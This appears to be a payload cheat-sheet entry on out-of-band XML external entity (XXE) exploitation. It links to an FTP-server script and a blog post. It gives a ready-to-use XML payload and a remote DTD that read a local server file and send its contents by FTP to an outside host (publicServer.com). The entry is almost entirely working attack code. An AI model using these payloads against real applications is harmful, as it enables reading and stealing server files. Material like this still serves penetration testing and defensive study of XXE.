# XXE FTP HTTP Server

https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb

http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html

```<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % remote SYSTEM "http://publicServer.com/parameterEntity_sendftp.dtd">
%remote;
%send;
]>
<data>4</data>
```

File stored on http://publicServer.com/parameterEntity_sendftp.dtd
```<!ENTITY % payload SYSTEM "file:///sys/power/image_size">
<!ENTITY % param1 "<!ENTITY &#37; send SYSTEM 'ftp://publicServer.com/%payload;'>">
%param1;
```
